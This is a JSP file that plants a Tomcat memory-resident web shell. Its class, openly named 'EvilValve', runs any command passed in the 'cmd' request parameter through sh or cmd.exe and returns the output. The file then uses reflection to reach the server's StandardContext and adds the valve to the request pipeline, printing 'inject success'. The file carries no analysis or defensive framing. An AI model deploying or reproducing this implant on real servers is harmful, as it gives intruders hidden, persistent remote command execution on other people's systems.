<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Scanner" %>

<%
    class EvilValve extends ValveBase {

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    PrintWriter out = response.getWriter();
                    out.println(output);
                    out.flush();
                    out.close();
                    this.getNext().invoke(request, response);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
%>

<%
    // 更简单的方法 获取StandardContext
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    standardContext.getPipeline().addValve(new EvilValve());

    out.println("inject success");
%>